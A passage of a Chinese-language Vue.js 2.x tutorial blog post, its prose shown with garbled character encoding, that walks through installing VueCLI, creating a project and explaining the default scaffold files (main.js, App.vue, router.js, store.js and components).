<p>è¿‘å¹´æ¥å‰ç«¯é¢†åŸŸå‘å±•é£é€Ÿï¼Œä»æœ€æ—©çš„ç›´æ¥å†™html, js, css åˆ°ä½¿ç”¨jQueryå¿«é€Ÿå¼€å‘ï¼Œå†åˆ°è¿‘å¹´æ¥ä½¿ç”¨Vuejsï¼ŒReactjs å®ç°å·¥ç¨‹åŒ–å¼€å‘ï¼Œä¹Ÿå°±çŸ­çŸ­åå‡ å¹´ã€‚è™½ç„¶å‰ç«¯é¡¹ç›®ç»“æ„è¶Šæ¥è¶Šå¤æ‚ï¼Œä½†ä¹Ÿè¶Šæ¥è¶Šè§„èŒƒï¼Œæ¸…æ™°ï¼Œæ›´åŠ å·¥ç¨‹åŒ–ã€‚å½“å‰è¾ƒä¸ºæµè¡Œçš„å‰ç«¯æ¡†æ¶æœ‰Vuejsã€Reactjsã€Angularjs ç­‰ï¼Œè€ŒVuejsç”±äºå…¶çµ(zhong)æ´»(wen)è½»(wen)ä¾¿(dang)ï¼Œè¾ƒä¸ºæµè¡Œã€‚è™½ç„¶Vuejsæœ‰å®Œå–„çš„ä¸­æ–‡æ–‡æ¡£ï¼Œä½†æ–‡æ¡£ä¸»è¦åœ¨ä»‹ç»å…¶ç”¨æ³•ï¼Œç¼ºå°‘å¦‚ä½•å®ç°ä¸€ä¸ªå®Œæ•´é¡¹ç›®çš„æŒ‡å¯¼ï¼Œæœ¬æ–‡å°±ä»‹ç»å¦‚ä½•ç”¨Vuejsåˆ›å»ºä¸€ä¸ªå®Œæ•´çš„å‰ç«¯é¡¹ç›®ï¼Œå¹¶ä¸åç«¯è¿›è¡Œäº¤äº’ã€‚</p>
<p><strong>æœ¬æ–‡åŸºäº<a href="mailto:Vuejs@2.x">Vuejs@2.x</a>åŠ<a href="mailto:VueCLI@3.x">VueCLI@3.x</a></strong></p>
<ol>
<li>æ‰€éœ€æŠ€æœ¯æ ˆï¼šhtml, javascript, cssåŸºç¡€çŸ¥è¯†ï¼Œå…¶ä¸­jså»ºè®®äº†è§£<strong>ES2015</strong>æ ‡å‡†ï¼Œç‰¹åˆ«è¦æŒæ¡<strong>promise</strong>çš„ä½¿ç”¨</li>
<li>ä½¿ç”¨çš„å·¥å…·ï¼š<del>å®‡å®™ç¬¬ä¸€ç¼–è¾‘å™¨</del> VSCode â€”â€” ç°åœ¨å¯¹vueé¡¹ç›®çš„æ”¯æŒå·²ç»å¾ˆå¥½äº†ï¼Œå¯ä»¥è‡ªåŠ¨å®‰è£…vueé¡¹ç›®éœ€è¦çš„æ’ä»¶</li>
</ol>
<h1 id="0x0-å®‰è£…">0x0 å®‰è£…</h1>
<blockquote>
<p>æ¨èä½¿ç”¨<a href="https://yarnpkg.com/lang/zh-hans">yarn</a>ä»£æ›¿npmä½œä¸ºåŒ…ç®¡ç†å™¨</p>
</blockquote>
<h2 id="å®‰è£…vuecli">å®‰è£…VueCLI</h2>
<blockquote>
<p>VueCLIæ˜¯Vuejså®˜æ–¹æ¨å‡ºçš„é¡¹ç›®è„šæ‰‹æ¶å·¥å…·ï¼Œå¯ä»¥æ–¹ä¾¿çš„åˆ›å»ºã€ç®¡ç†Vueé¡¹ç›®ï¼Œè¿˜æä¾›ä¼˜é›…çš„webç®¡ç†ç•Œé¢</p>
</blockquote>
<p>å…¨å±€å®‰è£…<a href="https://cli.vuejs.org/zh/">VueCLI</a></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">yarn global add @vue/cli
</code></pre></div><h2 id="å®‰è£…vue-devtools">å®‰è£…Vue-devtools</h2>
<blockquote>
<p><a href="https://github.com/vuejs/vue-devtools">Vue-devtools</a> æ˜¯vueå®˜æ–¹çš„æµè§ˆå™¨å¼€å‘æ’ä»¶ï¼Œå¯ä»¥æ–¹ä¾¿çš„åœ¨æµè§ˆå™¨ä¸­è°ƒè¯•vueåº”ç”¨</p>
</blockquote>
<p>Vue-devtools æä¾›å¤šå¹³å°çš„æµè§ˆå™¨æ’ä»¶å¯ä»¥ç›´æ¥å®‰è£…ä½¿ç”¨</p>
<p><a href="https://github.com/vuejs/vue-devtools#installation">installation</a></p>
<h1 id="0x1-æ–°å»ºé¡¹ç›®">0x1 æ–°å»ºé¡¹ç›®</h1>
<p>ä½¿ç”¨ <code>vue create vue_demo</code> åˆ›å»ºæ–°é¡¹ç›®ï¼Œæ¥ä¸‹æ¥ä¼šå‡ºç°ä¸€ä¸ªäº¤äº’å¼å‘½ä»¤è¡Œå¸®ä½ é…ç½®é¡¹ç›®ã€‚</p>
<p><strong>æ³¨æ„æ­¤å¤„ä¸è¦ä½¿ç”¨é»˜è®¤çš„é…ç½®ï¼å…·ä½“é…ç½®å‚è€ƒä¸‹å›¾</strong></p>
<blockquote>
<p>å‘x1 é»˜è®¤çš„é…ç½®ååˆ†ç®€å•ï¼Œæ–°æ‰‹ç»å¸¸ä¸çŸ¥é“æ€ä¹ˆå†™å¤šé¡µé¢ï¼Œå¼„ä¸æ˜ç™½é¡¹ç›®æ€ä¹ˆç»„ç»‡çš„ï¼Œæ‰€ä»¥éœ€è¦è‡ªå®šä¹‰é…ç½®ï¼Œæ·»åŠ vue-routeræ’ä»¶å®ç°å¤šé¡µé¢è·³è½¬</p>
</blockquote>
<p><a href="https://asciinema.org/a/240155"><img src="https://asciinema.org/a/240155.svg" alt="asciicast"></a></p>
<h1 id="0x2-é¡¹ç›®æ¡†æ¶">0x2 é¡¹ç›®æ¡†æ¶</h1>
<p>æ­¤æ—¶é¡¹ç›®å·²ç»åˆ›å»ºæˆåŠŸï¼Œå¦‚æœä½ æŒ‰ç…§æç¤ºå¯åŠ¨é¡¹ç›®å°±èƒ½çœ‹åˆ°ç»å…¸çš„vueå¯åŠ¨é¡µ</p>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1yg2r5ysxj30up0mx3zv.jpg" alt="image"></p>
<p>å½“å‰çš„é¡¹ç›®ç»“æ„å¦‚ä¸‹</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">.                     é¡¹ç›®æ ¹ç›®å½•
â”œâ”€â”€ README.md 
â”œâ”€â”€ babel.config.js
â”œâ”€â”€ package.json      é¡¹ç›®ä¸»é…ç½®æ–‡ä»¶
â”œâ”€â”€ public            å…¬å…±èµ„æºæ–‡ä»¶å¤¹
â”‚   â”œâ”€â”€ favicon.ico
â”‚   â””â”€â”€ index.html    å…¥å£html
â”œâ”€â”€ src               æºç æ ¹ç›®å½•
â”‚   â”œâ”€â”€ App.vue       å…¥å£æ–‡ä»¶
â”‚   â”œâ”€â”€ assets        èµ„æºæ–‡ä»¶å¤¹
â”‚   â”‚   â””â”€â”€ logo.png
â”‚   â”œâ”€â”€ components    ç»„ä»¶æ–‡ä»¶å¤¹
â”‚   â”‚   â””â”€â”€ HelloWorld.vue 
â”‚   â”œâ”€â”€ main.js       å…¥å£é…ç½®æ–‡ä»¶
â”‚   â”œâ”€â”€ router.js     è·¯ç”±æ–‡ä»¶
â”‚   â”œâ”€â”€ store.js      çŠ¶æ€ç®¡ç†
â”‚   â””â”€â”€ views         é¡µé¢æ–‡ä»¶å¤¹
â”‚       â”œâ”€â”€ About.vue
â”‚       â””â”€â”€ Home.vue
â””â”€â”€ yarn.lock         ä¾èµ–æ–‡ä»¶
</code></pre></div><p>åœ¨ä¸‹é¢çš„ç« èŠ‚å…·ä½“ä»‹ç»å„ä¸ªæ–‡ä»¶ã€æ–‡ä»¶å¤¹çš„ç”¨å¤„å’Œå¦‚ä½•ç»„ç»‡é¡¹ç›®ã€‚</p>
<h1 id="0x3-é¡¹ç›®ç»“æ„">0x3 é¡¹ç›®ç»“æ„</h1>
<p>ç”¨vueå¼€å‘çš„é¡¹ç›®ä¸€èˆ¬æ˜¯<a href="https://zh.wikipedia.org/wiki/%E5%8D%95%E9%A1%B5%E5%BA%94%E7%94%A8">SPA(å•é¡µåº”ç”¨)</a>ï¼Œé€šè¿‡åŠ¨æ€é‡å†™å½“å‰é¡µé¢æ¥ä¸ç”¨æˆ·äº¤äº’ï¼Œè€Œä¸ä¼šé‡æ–°åŠ è½½æ•´ä¸ªæ–°é¡µé¢ã€‚æ‰€ä»¥è¦ç»„ç»‡å¤šé¡µé¢å°±è¦é€šè¿‡vue-routeræ¥ç»„ç»‡é¡µé¢ï¼Œè€Œvuexç”¨æ¥ä¿å­˜çŠ¶æ€ã€‚</p>
<p>ä½œä¸ºå•é¡µåº”ç”¨ï¼Œå½“ç„¶éœ€è¦ä¸€ä¸ªå…¥å£htmlæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ <code>public/index.html</code> :</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">public/index.html

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width,initial-scale=1.0&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;icon&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&lt;%= BASE_URL %&gt;favicon.ico&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>vue_demo<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">noscript</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">strong</span><span class="p">&gt;</span>We&#39;re sorry but vue_demo doesn&#39;t work properly without JavaScript enabled. Please enable it to continue.<span class="p">&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">noscript</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="c">&lt;!-- built files will be auto injected --&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p>è¿™æ˜¯é»˜è®¤ç”Ÿæˆçš„ <code>index.html</code> ï¼Œè€Œç¼–è¯‘å¥½çš„æ–‡ä»¶ï¼ˆç½‘é¡µå†…å®¹ï¼‰ä¼šè¢«è‡ªåŠ¨æ³¨å…¥åˆ° `` ä¸­ï¼Œä¹Ÿå°±æ„å‘³ç€è¦ä½¿ç”¨vueå¼€å‘çš„åº”ç”¨ï¼Œæµè§ˆå™¨å¿…é¡»æ”¯æŒjsã€‚</p>
<p>è€Œ#appæ‰€ç»‘å®šçš„vueå®ä¾‹ï¼Œåˆ™ä½äº <code>src/main.js</code></p>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">main</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">App</span> <span class="nx">from</span> <span class="s1">&#39;./App.vue&#39;</span>
<span class="kr">import</span> <span class="nx">router</span> <span class="nx">from</span> <span class="s1">&#39;./router&#39;</span>
<span class="kr">import</span> <span class="nx">store</span> <span class="nx">from</span> <span class="s1">&#39;./store&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="nx">router</span><span class="p">,</span> <span class="c1">// ä½¿ç”¨vue-routeræ’ä»¶
</span><span class="c1"></span>  <span class="nx">store</span><span class="p">,</span> <span class="c1">// ä½¿ç”¨vuexæ’ä»¶
</span><span class="c1"></span>  <span class="nx">render</span><span class="o">:</span> <span class="nx">h</span> <span class="p">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">)</span> <span class="c1">// æ¸²æŸ“é¡µé¢
</span><span class="c1"></span><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span> <span class="c1">// ç»‘å®šåˆ° index.html -&gt; div#app
</span></code></pre></div><p>å…¶ä¸­æ¸²æŸ“çš„é¡µé¢ä½äº <code>src/App.vue</code></p>
<hr>
<blockquote>
<p>xxx.vue æ˜¯vueä¸­çš„<a href="https://cn.vuejs.org/v2/guide/single-file-components.html">å•æ–‡ä»¶ç»„ä»¶</a>ï¼Œå°† <code>html css javascript</code> é›†åˆåœ¨åŒä¸€ä¸ªæ–‡ä»¶ï¼Œä¾¿äºç»„ç»‡ç®¡ç†</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/App.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;nav&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/&#34;</span><span class="p">&gt;</span>Home<span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/about&#34;</span><span class="p">&gt;</span>About<span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">router-view</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">#</span><span class="nn">app</span> <span class="p">{</span>
  <span class="k">font-family</span><span class="p">:</span> <span class="s1">&#39;Avenir&#39;</span><span class="p">,</span> <span class="n">Helvetica</span><span class="p">,</span> <span class="n">Arial</span><span class="p">,</span> <span class="kc">sans-serif</span><span class="p">;</span>
  <span class="kp">-webkit-</span><span class="n">font-smoothing</span><span class="p">:</span> <span class="n">antialiased</span><span class="p">;</span>
  <span class="kp">-moz-</span><span class="n">osx-font-smoothing</span><span class="p">:</span> <span class="n">grayscale</span><span class="p">;</span>
  <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#2c3e50</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="p">{</span>
  <span class="k">padding</span><span class="p">:</span> <span class="mi">30</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="nt">a</span> <span class="p">{</span>
  <span class="k">font-weight</span><span class="p">:</span> <span class="kc">bold</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#2c3e50</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="nt">a</span><span class="p">.</span><span class="nc">router-link-exact-active</span> <span class="p">{</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#42b983</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>å…¶ä¸­ <code>æ˜¯é¡µé¢çš„ `html` å…ƒç´ ï¼Œ`style` æ˜¯æ ·å¼å…ƒç´ ï¼Œè¿˜å¯ä»¥æ·»åŠ ä¸€ä¸ª `javascript` ä¸ºjså…ƒç´ ã€‚å…¶ä¸­</code> æ˜¯è·¯ç”±ç»„ä»¶ï¼Œä¼šè¢«è‡ªåŠ¨æ¸²æŸ“æˆå½“å‰è·¯ç”±å¯¹åº”çš„é¡µé¢</p>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">router</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">Router</span> <span class="nx">from</span> <span class="s1">&#39;vue-router&#39;</span>
<span class="kr">import</span> <span class="nx">Home</span> <span class="nx">from</span> <span class="s1">&#39;./views/Home.vue&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Router</span><span class="p">)</span>
<span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Router</span><span class="p">({</span>
  <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;history&#39;</span><span class="p">,</span>
  <span class="nx">base</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">BASE_URL</span><span class="p">,</span>
  <span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span>
      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span>
      <span class="nx">component</span><span class="o">:</span> <span class="nx">Home</span>
    <span class="p">},</span>
    <span class="p">{</span>
      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/about&#39;</span><span class="p">,</span>
      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;about&#39;</span><span class="p">,</span>
      <span class="c1">// route level code-splitting
</span><span class="c1"></span>      <span class="c1">// this generates a separate chunk (about.[hash].js) for this route
</span><span class="c1"></span>      <span class="c1">// which is lazy-loaded when the route is visited.
</span><span class="c1"></span>      <span class="nx">component</span><span class="o">:</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="kr">import</span><span class="p">(</span><span class="cm">/* webpackChunkName: &#34;about&#34; */</span> <span class="s1">&#39;./views/About.vue&#39;</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">]</span>
<span class="p">})</span>
</code></pre></div><p>å¦‚ <code>http://localhost:8080/</code> ä¸‹ <code>è¢«æ¸²æŸ“æˆ `home` é¡µé¢ï¼Œ`http://localhost:8080/about` ä¸‹</code> è¢«æ¸²æŸ“æˆ <code>about</code> é¡µé¢ã€‚</p>
<blockquote>
<p>æŠ€å·§ è¿™é‡ŒåŠ è½½ç»„ä»¶ä½¿ç”¨å‡½æ•°åŠ è½½ï¼Œå°±å¯ä»¥å®ç°æ‡’åŠ è½½ä»¥ä¼˜åŒ–æ€§èƒ½ã€‚</p>
</blockquote>
<hr>
<p><code>src/views/</code> åˆ™æ˜¯ä¿å­˜é¡µé¢æ–‡ä»¶ï¼Œä¾‹å¦‚</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/views/Home.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;home&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;Vue logo&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;../assets/logo.png&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">HelloWorld</span> <span class="na">msg</span><span class="o">=</span><span class="s">&#34;Welcome to Your Vue.js App&#34;</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="c1">// @ is an alias to /src
</span><span class="c1"></span><span class="kr">import</span> <span class="nx">HelloWorld</span> <span class="nx">from</span> <span class="s1">&#39;@/components/HelloWorld.vue&#39;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span>
  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">HelloWorld</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p>è¿™å°±æ˜¯è·¯ç”± <code>home</code> å¯¹åº”çš„é¡µé¢ï¼Œå…¶ä¸­ç”¨åˆ°äº† <code>HelloWorld</code> ç»„ä»¶ï¼Œéœ€è¦åœ¨jsä¸­å¼•å…¥ã€‚</p>
<hr>
<p><code>src/components/</code> é‡Œé¢ä¿å­˜å¯å¤ç”¨çš„ç»„ä»¶ï¼Œä¾‹å¦‚ä¸Šé¢çš„ `` å°±æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç»„ä»¶ï¼ˆcomponentï¼‰</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/components/HelloWorld.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;hello&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>{{ msg }}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
      For a guide and recipes on how to configure / customize this project,<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
      check out the
      <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://cli.vuejs.org&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;_blank&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;noopener&#34;</span><span class="p">&gt;</span>vue-cli documentation<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>.
    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;HelloWorld&#39;</span><span class="p">,</span>
  <span class="nx">props</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">msg</span><span class="o">:</span> <span class="nb">String</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="c">&lt;!-- Add &#34;scoped&#34; attribute to limit CSS to this component only --&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
<span class="nt">h1</span> <span class="p">{</span>
  <span class="k">margin</span><span class="p">:</span> <span class="mi">40</span><span class="kt">px</span> <span class="mi">0</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>è¿™å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ç»„ä»¶ï¼Œç»“æ„å°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„å•æ–‡æœ¬ç»„ä»¶ï¼Œè¯´æ˜ç»„ä»¶å°±æ˜¯æŠŠä¸€éƒ¨åˆ†é¡µé¢é€»è¾‘æŠ½å‡ºæ¥ç»„æˆä¸€ä¸ªæ–‡ä»¶ã€‚è¿™æ ·çš„å¥½å¤„æ˜¯åˆ†ç¦»ä¸é¡µé¢æ— å…³çš„ç»„ä»¶ï¼Œä½¿é¡µé¢é€»è¾‘æ›´åŠ æ¸…æ™°ï¼ŒåŒæ—¶ä¹Ÿä¾¿äºå¤ç”¨ç»„ä»¶ã€‚å¦‚æœæœ‰ä»¥ä¸‹æƒ…å†µï¼Œæˆ‘å»ºè®®æŠŠéƒ¨åˆ†ä»£ç åˆ†ç¦»æˆç‹¬ç«‹çš„ç»„ä»¶ï¼š</p>
<ol>
<li>éœ€è¦å¤šæ¬¡å¤ç”¨çš„ç»„ä»¶ï¼Œå¦‚åŸºç¡€æŒ‰é’®ã€è¡¨å•ç­‰</li>
<li>è¾ƒä¸ºå¤æ‚ä½†ä¸é¡µé¢é€»è¾‘æ— å…³çš„ï¼Œå¦‚é¡µé¢çš„Headerã€Footerç­‰</li>
</ol>
<blockquote>
<p>æŠ€å·§ åœ¨ <code>style</code> è¡¨æƒ…ä¸Šæ·»åŠ  <code>scoped</code> å±æ€§å¯ä»¥é™åˆ¶CSSç”Ÿæ•ˆèŒƒå›´ä¸ºè¯¥ç»„ä»¶ï¼Œä¸ä¼šå½±å“å…¶ä»–å…ƒç´ ï¼Œåœ¨ç¼–è¯‘æ—¶vueè§£é‡Šå™¨ä¼šç»™è¿™äº›csså±æ€§åŠ ä¸Šéšæœºçš„hashä¿è¯å”¯ä¸€</p>
</blockquote>
<hr>
<p>vueè¿˜æä¾›äº†ä¸€ä¸ªçŠ¶æ€ç®¡ç†æ¨¡å¼ <a href="https://vuex.vuejs.org/zh/">vuex</a>ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„ç®¡ç†æ‰€æœ‰ç»„ä»¶çš„çŠ¶æ€ã€‚å¯¹åº”æ–‡ä»¶ <code>src/store.js</code></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">store</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">Vuex</span> <span class="nx">from</span> <span class="s1">&#39;vuex&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Vuex</span><span class="p">)</span>
<span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Vuex</span><span class="p">.</span><span class="nx">Store</span><span class="p">({</span>
  <span class="nx">state</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">},</span>
  <span class="nx">mutations</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">},</span>
  <span class="nx">actions</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">}</span>
<span class="p">})</span>
</code></pre></div><p><del>ç”±äºæˆ‘è¿˜æ²¡ç”¨è¿‡ <code>vuex</code> æ‰€ä»¥è‡ªå·±çœ‹æ–‡æ¡£å§</del></p>
<p>å¯¹äºç®€å•çš„åº”ç”¨ä¹Ÿå¯ä»¥ä¸ç”¨ <code>vuex</code> ï¼Œä¸€ä¸ªç®€å•çš„ <a href="https://cn.vuejs.org/v2/guide/state-management.html#%E7%AE%80%E5%8D%95%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E8%B5%B7%E6%AD%A5%E4%BD%BF%E7%94%A8"><code>store</code> æ¨¡å¼</a> å°±è¶³å¤Ÿäº†</p>
<h1 id="0x4-å¼€å‘æŒ‡å¼•">0x4 å¼€å‘æŒ‡å¼•</h1>
<p>æœ‰äº†ä¸Šé¢çš„åŸºç¡€ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å†™ä»£ç äº†ï¼Œè¿™é‡Œä»¥æ·»åŠ ä¸€ä¸ª <code>Foo</code> é¡µé¢å±•ç¤ºä»è¿œç«¯è·å¾—çš„æ•°æ®ä¸ºä¾‹</p>
<h2 id="1-ç»™é¡µé¢æ·»åŠ ä¸€ä¸ª-tab">1. ç»™é¡µé¢æ·»åŠ ä¸€ä¸ª <code>Tab</code></h2>
<p><code>Tab</code> å±äºä¸é¡µé¢é€»è¾‘æ— å…³ï¼Œä½†åˆå¤„å¤„è¦ä½¿ç”¨çš„å…ƒç´ ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å…¶ç‹¬ç«‹æˆä¸ºä¸€ä¸ªç»„ä»¶</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/components/Tab.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;tab&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/&#39;)&#34;</span><span class="p">&gt;</span>
